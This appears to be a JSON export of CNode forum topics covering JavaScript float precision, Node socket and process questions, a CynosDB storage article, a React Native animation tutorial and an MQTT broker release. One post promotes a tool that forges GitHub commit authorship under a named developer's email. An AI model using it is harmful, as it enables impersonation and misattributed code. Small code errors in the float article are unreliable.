位，取值范围是 0 到 2047。当指数位 e=0 或者 e=2017 时，根据有效数字位 f 是否为 0 ，具有不同的特殊含义，具体见下表：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/d0walmraa0.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>对于常用的 normal number, 为了方便表示指数为负数的情况，所以，指数位数值大小做了一个 -1023 的偏移量。对于一个非 0 数字而言，,它的二进制的科学计数法里的第一位有效数字固定是 1。这样，一个双精度浮点型数字的值就是</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/kibxn6cd0w.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>对于 subnormal number,它可以用来表示更加接近于 0 的数，它特殊的地方是有效数字位的前面补充的是 0 而不是 1，且指数为偏移量是 -1022，所以值是：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/j2usy0qlgw.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>Number 对象中的几个属性值</h2>\n<p>知道了 Number 是如何存储之后，Number 对象的属性是如何取值的就明朗了。</p>\n<p>Number.MAX_VALUE：可表示的最大的数，显然 e 和 f 都取最大时能表示的数最大，值为</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/h3jb5o4s9x.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Number.MIN_VALUE：可表示的最小的正数，用最小的 subnormal number 来表示。当 e = 0 ,f 的最后一位为 1，其他为 0 时最小，值为</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/nmvd9q0u0r.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Number.EPSILON : 表示 1 与 Number 可表示的大于 1 的最小的浮点数之间的差值。值为</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/uo954ud213.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Number.MAXSAFEINTEGER：表示在 JavaScript 中最大的安全整数。可以连续且精确被表示出来的整数成为安全整数，比如 2^54 就不是个安全整数，因为它和 2^54+1 两个数的表示是完全一样的，e=1077,f=0。 <code>Math.pow(2,54)===Math.pow(2,54)+1// true</code>。整数转化为二进制后，小数点后是不会有数字的，而用二进制的科学计数法表示时，小数点后最多保留 52 位，加上前置的一个 1，有 53 位数字，所以当一个数转化二进制时，如果位数超过 53 位，必然会截断末尾的部分，即导致不能精确表示，即为不安全整数。所以最小的会被截断的整数是 100…001=2^53+1（中间有52个0）。这个数设为 X，则比 X 小的整数都能被精确表示出来，再加上“连续”这个条件，所以 X-1 不是我们要的答案，X-2 才是。 <code>Number.MAX_SAFE_INTEGER</code> 最终值为</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/8iwmf5n2is.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Number.MINSAFEINTEGER：表示在 JavaScript 中最小的安全整数，对 <code>Number.MAX_SAFE_INTEGER</code> 取负值即可，值为 -9007199254740991</p>\n<h2>为什么0.1+0.2不等于0.3</h2>\n<p>现在看看 <code>console.log(0.1+0.2===0.3)// false</code> 这个问题，数字 0.1 转化成二进制是 0.0001100110011… 即 1.10011001…1001 * 2^-4 （小数部分有52位，即有13个1001循环）。由于第 53 位是 1，类似 10 进制的四舍五入，二进制是“零舍一入”，所以 0.1 的最终二进制科学计数法表示是 1.10011001…1010 * 2^-4，即二进制数值大小实际上是 0.000110011001…10011010。下面的代码验证了这个值（打印出来的值，把最末尾的0去掉了）：</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 0.1;console.log(a.toString(2)); &#x2F;&#x2F;0.0001100110011001100110011001100110011001100110011001101\n</code></pre><p>同理十进制数字 0.2 转化为二进制的最终值是 1.10011001…1010 * 2^-3 即 0.00110011…100111010；十进制 0.3 转化位二进制的最终值是 1.00110011…0011 * 2^-2</p>\n<pre class=\"prettyprint language-javascript\"><code>var b = 0.2;console.log(b.toString(2)); &#x2F;&#x2F;0.001100110011001100110011001100110011001100110011001101var c = 0.3;console.log(c.toString(2)); &#x2F;&#x2F;0.010011001100110011001100110011001100110011001100110011\n</code></pre><p>所以，0.1+0.2 的值即为上面 0.1 和 0.2 对应的二进制数值的相加，如下图所示</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1034093/p02r42rnjq.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>上图中，对所得的和，“零舍一入”保留 52 位有效小数就是最终的值：0.01001100…110100（第 53 位是 1 ，所以往前进了 1），如下代码所示。这个值与上文中的 0.3 的最终二进制表示的值明显不相同，即解释了 0.1 + 0.2 不等于 0.3 的根本原因所在（实际上，这个值转化为 10 进制约等于 0.30000000000000004）。注：打印出来的长度是 54，因为有 52 位有效小数，前面是’0.01’,长度是 4，最后去掉末尾的 2 个 0，所以最后打印出来的长度是 52+4-2 = 54。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = 0.1 + 0.2;console.log(d.toString(2)); &#x2F;&#x2F;0.0100110011001100110011001100110011001100110011001101console.log(d.toString(2).length); &#x2F;&#x2F; 54\n</code></pre><h2>浮点数精度运算解决方案</h2>\n<p>关于 js 浮点数运算精度丢失的问题，不同场景可以有不同的解决方案。 1、如果只是用来展示一个浮点数的结果，则可以借用 Number 对象的 toFixed 和 parseFloat 方法。下面代码片段中，fixed 参数表示要保留几位小数，可以根据实际场景调整精度。</p>\n<pre class=\"prettyprint language-javascript\"><code>function formatNum(num, fixed = 10) {    return parseFloat(a.toFixed(fixed))}var a = 0.1 + 0.2;console.log(formatNum(a)); &#x2F;&#x2F;0.3\n</code></pre><p>2、如果需要进行浮点数的加减乘除等运算，由上文可知，在小于 Number.MAXSAFEINTEGER 范围的整数是可以被精确表示出来的，所以可以先把小数转化为整数，运算得到结果后再转化为对应的小数。比如两个浮点数的加法：</p>\n<pre class=\"prettyprint language-javascript\"><code> function add(num1, num2) {  var decimalLen1 = (num1.toString().split(&#x27;.&#x27;)[1] || &#x27;&#x27;).length; &#x2F;&#x2F;第一个参数的小数个数  var decimalLen2 = (num2.toString().split(&#x27;.&#x27;)[1] || &#x27;&#x27;).length; &#x2F;&#x2F;第二个参数的小数个数  var baseNum = Math.pow(10, Math.max(decimalLen1, decimalLen2));  return (num1 * baseNum + num2 * baseNum) &#x2F; baseNum;}console.log(add(0.1 , 0.2)); &#x2F;&#x2F;0.3\n</code></pre><p>参考资料</p>\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/IEEE_754\">https://en.wikipedia.org/wiki/IEEE_754</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\">https://en.wikipedia.org/wiki/Double-precision_floating-point_format</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Normal_number_(computing)\">https://en.wikipedia.org/wiki/Normal_number_(computing)</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Denormal_number\">https://en.wikipedia.org/wiki/Denormal_number</a></li>\n</ul>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"JS中如何理解浮点数？","last_reply_at":"2018-12-26T04:02:20.714Z","good":false,"top":false,"reply_count":0,"visit_count":532,"create_at":"2018-12-26T04:02:20.714Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c20514076c4964062a1cee4","author_id":"5bfd65d4be1b120abac5d838","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-js\"><code>let net = require(&#x27;net&#x27;);\nlet socket = new net.Socket();\nsocket.destroy();\nsocket = null;\n</code></pre><p>此时 socket 无法回收？然后注释掉 destroy，就是可以回收？\n好奇怪？这是什么原因？</p>\n<p><a href=\"/user/hyj1991\">@hyj1991</a></p>\n</div>","title":"当直接new net.Socket(); 然后 destory时。 此时的 socket 内存无法回收？好奇怪","last_reply_at":"2018-12-26T03:20:45.958Z","good":false,"top":false,"reply_count":2,"visit_count":692,"create_at":"2018-12-24T03:23:44.304Z","author":{"loginname":"Aaron009","avatar_url":"https://avatars1.githubusercontent.com/u/3838050?v=4&s=120"}},{"id":"5baf44ff15e4fd1923f48b84","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>前段时间看到可以通过修改git的邮箱实现，实现伪造记录，但是修改起来还挺麻烦的，大佬的账号不能在命令行中保存，遂做了一个命令行工具，专门用来伪造github的提交请求。😎</p>\n<h1>先看效果</h1>\n<blockquote>\n<p>伪造了当年TJ大佬的提交记录\n<img src=\"//static.cnodejs.org/FlQuGc7IzHHVFAIHaF9imStzyFne\" alt=\"notTJop.gif\"></p>\n</blockquote>\n<h1>是不是很想要TJ大神的力量</h1>\n<p>来吧，全局安装完，直接敲命令就能实现</p>\n<pre class=\"prettyprint language-sh\"><code># 全局安装 git-fake\nnpm install git-fake -g\n# 看看是否安装成功\ngitfake -V\n# 在项目根目录使用TJ的邮箱(只对该项目生效)\n# 如果要伪造别人的账号，直接在github看邮箱即可\ngitfake -u tj@apex.sh\n# 对于使用过的账号，直接就能选择\ngitfake -c\n</code></pre><p>剩下的工作就是在这个项目提交代码了，提交完成后可以使用&quot;git log&quot;命令查看提交记录的邮箱是否被修改，如下\n<img src=\"https://github.com/zy445566/myBlog/blob/master/20180929git-fake/gitlog.png?raw=true\" alt=\"gitlog\"></p>\n<h1>缺点</h1>\n<p>不过假的终究是假的，努力提升自己水平才是王道啊</p>\n</div>","title":"让大佬向你仓库PR关键技术，拿去装逼，不要谢我","last_reply_at":"2018-12-25T18:40:13.017Z","good":false,"top":false,"reply_count":26,"visit_count":2043,"create_at":"2018-09-29T09:25:19.564Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"58d233a32b2f9e0c36121786","author_id":"58a3cbadcefe06e13676a827","tab":"ask","content":"<div class=\"markdown-text\"><h4>node 进程kill后，为什么又会自动启动</h4>\n<p>ubuntu 版本为 16.04</p>\n<h4>服务器是1g1核的，是不是没有没要使用pm2。</h4>\n<p><img src=\"//static.cnodejs.org/FtSu2AazB7N3zH6lGyylQbRM6Xsm\" alt=\"untitled1.png\">\n部署的时候不太记得了，看起来没有使用pm2部署。\n可能是直接使用 node index.js 运行的。\n现在想关闭这个进程，发现怎么关都关不掉。\n找到pid，尝试kill，pkill之类的，关掉了，node会自动又启动。</p>\n<p>现在node怎么都关不掉了。。。不知道怎么操作，求路过的大神指点一二，感激不尽。</p>\n</div>","title":"如何关闭ubuntu上的node进程","last_reply_at":"2018-12-25T14:00:41.199Z","good":false,"top":false,"reply_count":9,"visit_count":3203,"create_at":"2017-03-22T08:19:47.473Z","author":{"loginname":"a304885433","avatar_url":"https://avatars1.githubusercontent.com/u/3955567?v=4&s=120"}},{"id":"5c1b59b83898674067a76760","author_id":"5ad5856c3edb2aff6be85abf","tab":"ask","content":"<div class=\"markdown-text\"><p>在写代码的时候碰见了一个问题。\n首先， 我需要维护一个队列， 有多个方法可以在队列里面插入对象。比如：</p>\n<pre class=\"prettyprint language-js\"><code>let fifo = [];\nfunction productor1(){\n\tfifo.push[obj1]\n}\nfunction productor2(){\n\tfifo.push[obj2]\n}\n</code></pre><p>然后， 有一个方法来消耗这个数组， 这个是同步的， 第一个数组元素消耗完才能消耗第二个数组元素。</p>\n<pre class=\"prettyprint\"><code>function consumer(){\n\tlet obj = fifo.shift()\n\t&#x2F;&#x2F;处理\n}\n</code></pre><p>我应该怎样做到生产者跟消费者同时进行， 并且当数组为空的时候消费者休息， 当生产者往里面加入数据的时候， 消费者又马上开始消费。\n<strong>尽量用emit来实现， 不要用定时器来判断， 感觉太占资源了</strong></p>\n</div>","title":"nodejs 生产者跟消费者有没有好的解决方法","last_reply_at":"2018-12-25T11:09:32.703Z","good":false,"top":false,"reply_count":9,"visit_count":1284,"create_at":"2018-12-20T08:58:32.086Z","author":{"loginname":"papandadj","avatar_url":"https://avatars1.githubusercontent.com/u/25424898?v=4&s=120"}},{"id":"5c2200a23898674067a783cb","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表\n本文作者：许中清，腾讯云自研数据库CynosDB的分布式存储CynosStore负责人。从事数据库内核开发、数据库产品架构和规划。曾就职于华为，2015年加入腾讯，参与过TBase（PGXZ）、CynosDB等数据库产品研发。专注于关系数据库、数据库集群、新型数据库架构等领域。目前担任CynosDB的分布式存储CynosStore负责人。</p>\n</blockquote>\n<p>CynosDB for PostgreSQL是腾讯云自研的一款云原生数据库，其主要核心思想来自于亚马逊的云数据库服务Aurora。这种核心思想就是“基于日志的存储”和“存储计算分离”。同时，CynosDB在架构和工程实现上确实有很多和Aurora不一样的地方。</p>\n<p>下图为CynosDB for PostgreSQL的产品架构图，CynosDB是一个基于共享存储、支持一写多读的数据库集群。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/rtjrqgoeu1.jpg?imageView2/2/w/1620\" alt=\"img\">CynosDB for PostgreSQL产品架构图</p>\n<p>CynosDB基于CynosStore之上，CynosStore是一个分布式存储，为CynosDB提供坚实的底座。CynosStore由多个Storage Node和CynosStore Client组成。CynosStore Client以二进制包的形式与DB（PostgreSQL）一起编译，为DB提供访问接口，以及负责主从DB之间的日志流传输。除此之外，每个Storage Node会自动将数据和日志持续地备份到腾讯云对象存储服务COS上，用来实现PIT（Point In Time）功能。</p>\n<p>CynosStore会为每一个数据库分配一段存储空间，我们称之为Pool，一个数据库对应一个Pool。数据库存储空间的扩缩容是通过Pool的扩缩容来实现的。一个Pool会分成多个Segment Group（SG），每个SG固定大小为10G。我们也把每个SG叫做一个逻辑分片。一个Segment Group（SG）由多个物理的Segment组成，一个Segment对应一个物理副本，多个副本通过RAFT协议来实现一致性。Segment是CynosStore中最小的数据迁移和备份单位。每个SG保存属于它的数据以及对这部分数据最近一段时间的写日志。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/w6zz6oyfs8.jpg?imageView2/2/w/1620\" alt=\"img\">CynosStore 数据组织形式</p>\n<p>图二中CynosStore一共有3个Store Node，CynosStore中创建了一个Pool，这个Pool由3个SG组成，每个SG有3个副本。CynosStore还有空闲的副本，可以用来给当前Pool扩容，也可以创建另一个Pool，将这空闲的3个Segment组成一个SG并分配个这个新的Pool。</p>\n<p>数据库用户有可能因为某种原因需要回到过去某个时间点的数据库快照，CynosDB提供快照备份特性，满足用户的回档需求。当然，可以回到过去的时间段总是有限的，这取决于快照备份的存储空间成本。CynosStore通过持续不断地将各个SG上的数据和日志备份到腾讯云对象存储服务COS上。其中，基础数据的快照根据一定频率定期备份，而日志则从RAFT状态机中源源不断地向COS备份。为了避免备份本身对SG的同步日志过程产生影响， SG会先将日志持久化到所在Store Node的本地存储，然后通过Journal Backup Service将本地Journal上传到COS。每个SG向COS备份的过程是完全独立并互不依赖的。每个SG备份时的故障处理也是独立的。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/5eshdkjghk.jpg?imageView2/2/w/1620\" alt=\"img\">CynosStore即时恢复</p>\n<p>相比SG的备份，一个数据库实例回档到某个时间点的过程要复杂得多，因为回档过程必须保证这个Pool的所有SG回到同一个快照点。当CynosStore接收到一个回档Pool的请求，CynosStore会根据这个Pool上所有SG备份的日志信息找到并计算出与这个时间点对应的VDL。这个计算的依据是每个SG的日志中会定期不断地加入一个时间戳日志。每个SG根据需要回档的时间点和Pool全局VDL找到时间上最接近的前一个快照以及相应的日志文件。然后根据快照和日志重放SG，各个SG重放过</p>\n<p>程互不依赖。这个回档过程借助Replayer Service服务来完成，其根据某个SG的快照数据和日志重放到给定的一致性点，并将新产生的快照数据上传到COS。然后由META Center在CynosStore中构建新的Pool和新的SG，通知新SG leader从COS获取刚刚生成的快照数据，这样就完成了一个SG的回档。当这个Pool上所有的SG的回档完成，那么这个Pool的回档也就完成了。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"自研数据库CynosDB存储系统如何实现即时恢复","last_reply_at":"2018-12-25T10:04:18.693Z","good":false,"top":false,"reply_count":0,"visit_count":521,"create_at":"2018-12-25T10:04:18.692Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c21fa923898674067a78328","author_id":"58f837a3bbaf2f3f569be082","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>想先推荐一下近期在写的一个React Native项目，名字叫 <a href=\"https://github.com/shuiRong/Gakki\">Gakki</a> ：是一个<a href=\"https://cmx.im\">Mastodon</a>的第三方客户端 （Android App）</p>\n</blockquote>\n<p><strong>预览</strong></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/4826151-4d013d8e6d431e9a.gif\" alt=\"rn.gif\"></p>\n<h3>#写在前面</h3>\n<hr>\n<p>本来我也不想造这个轮子的，奈何没找到合适的组件。只能自己上了～</p>\n<p><strong>思路很清楚：</strong> 监听滚动事件，动态修改Header组件和Content组件的top值（当然，他们默认都是position:relative）。</p>\n<p>接下来实现的时候遇到了问题，我第一个版本是通过动态设置state来实现，即：</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;**\n * 每次滚动时，重新设置headerTop的值\n *&#x2F;\nonScroll = event =&gt;{\n    const y = event.nativeEvent.contentOffset.y\n    if (y &gt;= 270) return\n    &#x2F;&#x2F; headerTop即是Header和Content的top样式对应的值\n    this.setState({\n        headerTop: y\n    })\n}\n</code></pre><p>这样虽然能实现，但是效果不好：明显可以看到在上滑的过程中，Header组件一卡一卡地向上方移动（一点都不流畅）。</p>\n<p>因为就只能另寻他法了：<strong>动画</strong></p>\n<blockquote>\n<p>React Native 提供了两个互补的动画系统：用于创建精细的交互控制的动画<a href=\"https://reactnative.cn/docs/animations#animated-api\"><code>Animated</code></a>和用于全局的布局动画<a href=\"https://reactnative.cn/docs/animations#layoutanimation-api\"><code>LayoutAnimation</code></a> （笔者注：这次没有用到它）</p>\n</blockquote>\n<h3>#Animated 相关API介绍</h3>\n<hr>\n<p>首先，这儿有一个简单“逐渐显示”动画的<a href=\"https://reactnative.cn/docs/animations/#docsNav\">DEMO</a>，需要你先看完（文档很简单明了且注释清楚，没必要Copy过来）。</p>\n<p>在看懂了DEMO的基础上，我们还需要了解两个<strong>关键</strong>的API才能实现完整的效果：</p>\n<p><strong>1. interpolate</strong></p>\n<p>插值函数。用来对不同类型的数值做映射处理。</p>\n<blockquote>\n<p>当然，这是文档说明：</p>\n<p>Each property can be run through an interpolation first. An interpolation maps input ranges to output ranges, typically using a linear interpolation but also supports easing functions. By default, it will extrapolate the curve beyond the ranges given, but you can also have it clamp the output value.</p>\n<p>翻译：</p>\n<p>每个属性可以先经过插值处理。插值对输入范围和输出范围之间做一个映射，通常使用线性插值，但也支持缓和函数。默认情况下，<strong>如果给定数据超出范围，他也可以自行推断出对于的曲线</strong>，但您也可以让它箝位输出值（P.S. 最后一句可能翻译错误，因为没搞懂clamp value指的是什么, sigh…）</p>\n</blockquote>\n<p><strong>举个例子：</strong></p>\n<p>在实现一个图片旋转动画时，输入值只能是这样的：</p>\n<pre class=\"prettyprint language-react\"><code>this.state = {\n  rotate: new Animated.Value(0) &#x2F;&#x2F; 初始化用到的动画变量\n}\n\n...\n\n&#x2F;&#x2F; 这么映射是因为style样式需要的是0deg这样的值，你给它0这样的值，它可不能正常工作。因此必定需要一个映射处理。\nthis.state.rotate.interpolate({ &#x2F;&#x2F; 将0映射成0deg，1映射成360deg。当然中间的数据也是如此映射。\n  inputRange: [0, 1],\n  outputRange: [&#x27;0deg&#x27;, &#x27;360deg&#x27;]\n})\n</code></pre><p><strong>2. Animated.event</strong></p>\n<p>一般动画的输入值都是默认设定好的，比如前面DEMO中的逐渐显示动画中的透明度：开始是0，最后是1。这是已经写死了的。</p>\n<p>但如果有些动画效果需要的不是写死的值，而是动态输入的呢，比如：手势（上滑、下滑，左滑，右滑…）、其它事件。</p>\n<p>那就用到了<code>Animated.event</code>。</p>\n<p>直接看一个<strong>将滚动事件的y值(滚动条距离顶部高度)和我们的动画变量绑定起来</strong>的例子：</p>\n<pre class=\"prettyprint language-react\"><code>&#x2F;&#x2F; 这段代码表示：在滚动事件触发时，将event.nativeEvent.contentOffset.y 的值动态绑定到this.state.headerTop上\n&#x2F;&#x2F; 和最前面我通过this.setState动态设置的目的一样，但交给Animated.event做就不会造成视觉上的卡顿了。\nonScroll={Animated.event([\n   {\n      nativeEvent: {\n        contentOffset: { y: this.state.headerTop }\n      }\n   }\n])}\n</code></pre><p>关于API更多的说明请移步<a href=\"https://reactnative.cn/docs/animated.html#%E5%A4%84%E7%90%86%E6%89%8B%E5%8A%BF%E5%92%8C%E5%85%B6%E4%BB%96%E4%BA%8B%E4%BB%B6\">文档</a></p>\n<h3>#完整代码</h3>\n<hr>\n<pre class=\"prettyprint language-react\"><code>import React, { Component } from &#x27;react&#x27;\nimport { StyleSheet, Text, View, Animated, FlatList } from &#x27;react-native&#x27;\n\nclass List extends Component {\n  render() {\n    &#x2F;&#x2F; 模拟列表数据\n    const mockData = [\n      &#x27;富强&#x27;,\n      &#x27;民主&#x27;,\n      &#x27;文明&#x27;,\n      &#x27;和谐&#x27;,\n      &#x27;自由&#x27;,\n      &#x27;平等&#x27;,\n      &#x27;公正&#x27;,\n      &#x27;法治&#x27;,\n      &#x27;爱国&#x27;,\n      &#x27;敬业&#x27;,\n      &#x27;诚信&#x27;,\n      &#x27;友善&#x27;\n    ]\n\n    return (\n      &lt;FlatList\n        onScroll={this.props.onScroll}\n        data={mockData}\n        renderItem={({ item }) =&gt; (\n          &lt;View style={styles.list}&gt;\n            &lt;Text&gt;{item}&lt;&#x2F;Text&gt;\n          &lt;&#x2F;View&gt;\n        )}\n      &#x2F;&gt;\n    )\n  }\n}\n\nexport default class AnimatedScrollDemo extends Component {\n  constructor(props) {\n    super(props)\n    this.state = {\n      headerTop: new Animated.Value(0)\n    }\n  }\n\n  componentWillMount() {\n    &#x2F;&#x2F; P.S. 270,217,280区间的映射是告诉interpolate，所有大于270的值都映射成-50\n    &#x2F;&#x2F; 这样就不会导致Header在上滑的过程中一直向上滑动了\n    this.top = this.state.headerTop.interpolate({\n      inputRange: [0, 270, 271, 280],\n      outputRange: [0, -50, -50, -50]\n    })\n\n    this.animatedEvent = Animated.event([\n      {\n        nativeEvent: {\n          contentOffset: { y: this.state.headerTop }\n        }\n      }\n    ])\n  }\n\n  render() {\n    return (\n      &lt;View style={styles.container}&gt;\n        &lt;Animated.View style={{ top: this.top }}&gt;\n          &lt;View style={styles.header}&gt;\n            &lt;Text style={styles.text}&gt;linshuirong.cn&lt;&#x2F;Text&gt;\n          &lt;&#x2F;View&gt;\n        &lt;&#x2F;Animated.View&gt;\n        {&#x2F;* 在oHeader组件上移的同时，列表容器也需要同时向上移动，需要注意。 *&#x2F;}\n        &lt;Animated.View style={{ top: this.top }}&gt;\n          &lt;List onScroll={this.animatedEvent} &#x2F;&gt;\n        &lt;&#x2F;Animated.View&gt;\n      &lt;&#x2F;View&gt;\n    )\n  }\n}\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1\n  },\n  list: {\n    height: 80,\n    backgroundColor: &#x27;pink&#x27;,\n    marginBottom: 1,\n    alignItems: &#x27;center&#x27;,\n    justifyContent: &#x27;center&#x27;,\n    color: &#x27;white&#x27;\n  },\n  header: {\n    height: 50,\n    backgroundColor: &#x27;#3F51B5&#x27;,\n    alignItems: &#x27;center&#x27;,\n    justifyContent: &#x27;center&#x27;\n  },\n  text: {\n    color: &#x27;white&#x27;\n  }\n})\n\n</code></pre></div>","title":"ReactNative: 使用Animted API实现向上滚动时隐藏Header组件","last_reply_at":"2018-12-25T09:38:26.811Z","good":false,"top":false,"reply_count":0,"visit_count":620,"create_at":"2018-12-25T09:38:26.811Z","author":{"loginname":"shuiRong","avatar_url":"https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"}},{"id":"5b515f59fb9e84ec69cc1c62","author_id":"560b3a2848055cd15e2c8957","tab":"share","content":"<div class=\"markdown-text\"><h1>MqttWk</h1>\n<p>基于 nutzboot + t-io + redis + kafka 实现的MQTT服务broker</p>\n<p>本项目代码主要来源于 netty/t-io/iot-mqtt-server 等众多项目，开源免费，欢迎交流学习</p>\n<h1>项目地址</h1>\n<p><a href=\"https://github.com/Wizzercn/MqttWk\">https://github.com/Wizzercn/MqttWk</a>\n<a href=\"https://gitee.com/wizzer/MqttWk\">https://gitee.com/wizzer/MqttWk</a></p>\n<h1>参考项目</h1>\n<ul>\n<li><a href=\"https://github.com/netty/netty\">https://github.com/netty/netty</a></li>\n<li><a href=\"https://gitee.com/tywo45/tio-showcase/\">https://gitee.com/tywo45/tio-showcase/</a></li>\n<li><a href=\"https://gitee.com/recallcode/iot-mqtt-server\">https://gitee.com/recallcode/iot-mqtt-server</a></li>\n</ul>\n<h1>使用说明</h1>\n<h4>软件架构说明</h4>\n<ol>\n<li>使用t-io实现通信及协议解析</li>\n<li>使用nutzboot提供依赖注入及属性配置</li>\n<li>使用redis实现消息缓存,集群</li>\n<li>使用kafka实现消息代理</li>\n</ol>\n<h4>项目结构</h4>\n<pre class=\"prettyprint\"><code>MqttWk\n  ├── mqtt-codec -- MQTT协议解析的t-io实现\n  ├── mqtt-auth -- MQTT服务连接时用户名和密码认证\n  ├── mqtt-broker -- MQTT服务器功能的核心实现\n  ├── mqtt-common -- 公共类及其他模块使用的服务接口及对象\n  ├── mqtt-store -- MQTT服务器会话信息(redis缓存及kafka加载)\n  ├── mqtt-zoo -- 教程文档或文件\n    ├── mqtt-test-kafka -- kafka消费者接收消息\n    ├── mqtt-test-websocket -- websocket通信测试示例\n</code></pre><h4>功能说明</h4>\n<ol>\n<li>参考MQTT3.1.1规范实现</li>\n<li>完整的QoS服务质量等级实现</li>\n<li>遗嘱消息, 保留消息及消息分发重试</li>\n<li>心跳机制</li>\n<li>MQTT连接认证(可选择是否开启)</li>\n<li>SSL方式连接(可选择是否开启)</li>\n<li>主题过滤(支持单主题订阅如 /mqtt/test --不可以/结尾, 通配符订阅 /mqtt/# --以/#结尾)</li>\n<li>Websocket支持(可选择是否开启)</li>\n<li>集群功能(可选择是否开启)</li>\n<li>Kafka消息转发功能(可选择是否开启)</li>\n</ol>\n<h4>快速开始</h4>\n<ul>\n<li>项目根目录执行  <code>mvn install</code></li>\n<li>mqtt-broker 下执行 <code>mvn clean package nutzboot:shade</code> 进行打包</li>\n<li><code>java -jar mqtt-broker-xxx.jar -Dnutz.profiles.active=prod</code> [此时加载application-prod.properties配置文件]</li>\n<li>打开mqtt-spy客户端, 填写相应配置<a href=\"https://github.com/eclipse/paho.mqtt-spy/wiki/Downloads\">下载</a></li>\n<li>连接端口:8885, websocket 端口: 9995 websocket</li>\n<li>连接使用的用户名: demo</li>\n<li>连接使用的密码: 8F3B8DE2FDC8BD3D792BE77EAC412010971765E5BDD6C499ADCEE840CE441BDEF17E30684BD95CA708F55022222CC6161D0D23C2DFCB12F8AC998F59E7213393</li>\n<li>连接使用的证书在 <code>mqtt-zoo</code>\\keystore\\server.cer</li>\n</ul>\n<h4>集群使用</h4>\n<ul>\n<li>多机环境集群:\n<ul>\n<li><code>mqttwk.broker.cluster-on=true</code></li>\n<li><code>mqttwk.broker.kafka.bootstrap.servers=192.168.1.101:9092,192.168.1.102:9093</code></li>\n<li><code>redis.mode=cluster</code></li>\n<li><code>redis.nodes=192.168.1.103:16379,192.168.1.104:26379</code></li>\n</ul>\n</li>\n<li>单机环境集群:\n<ul>\n<li><code>mqttwk.broker.cluster-on=true</code></li>\n<li><code>mqttwk.broker.kafka.bootstrap.servers=127.0.0.1:9092,127.0.0.1:9093</code></li>\n<li><code>redis.mode=normal</code></li>\n<li><code>redis.host=127.0.0.1</code></li>\n</ul>\n</li>\n</ul>\n<h4>自定义 - 连接认证</h4>\n<ul>\n<li>默认只是简单使用对用户名进行RSA密钥对加密生成密码, 连接认证时对密码进行解密和相应用户名进行匹配认证</li>\n<li>使用中如果需要实现连接数据库或其他方式进行连接认证, 只需要重写<code>mqtt-auth</code>模块下的相应方法即可</li>\n</ul>\n<h4>自定义 - 服务端证书</h4>\n<ul>\n<li>服务端证书存储在<code>mqtt-broker</code>的<code>resources/keystore/server.jks</code></li>\n<li>用户可以制作自己的证书, 但存储位置和文件名必须使用上述描述的位置及文件名</li>\n</ul>\n<h4>生产环境部署</h4>\n<ul>\n<li>多机环境集群</li>\n<li>负载均衡: 富人用 L4 Switch,穷人用 Linux HAProxy</li>\n</ul>\n</div>","title":"MqttWk：基于 NutzBoot + t-io 的 MQTT Broker 服务端发布","last_reply_at":"2018-12-25T07:00:28.805Z","good":false,"top":false,"reply_count":5,"visit_count":1469,"create_at":"2018-07-20T04:04:41.202Z","author":{"loginname":"Wizzercn","avatar_url":"https://avatars0.githubusercontent.com/u/2408114?v=4&s=120"}},{"id":"5c21a51776c4964062a1d753","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<blockquote>\n<p>作者介绍：简怀兵，腾讯云数据库高级工程师，负责腾讯云CDB内核及基础设施建设；先后供职于Thomson Reuters和YY等公司，PTimeDB作者，曾获一项发明专利；从事MySQL内核开发工作8年，具有丰富的优化经验；在分布式存储等领域有较丰富经验。</p>\n</blockquote>\n<p>MYSQL数据库适用场景广泛，相较于Oracle、DB2性价比更高，Web网站、日志系统、数据仓库等场景都有MYSQL用武之地，但是也存在对于事务性支持不太好（MySQL 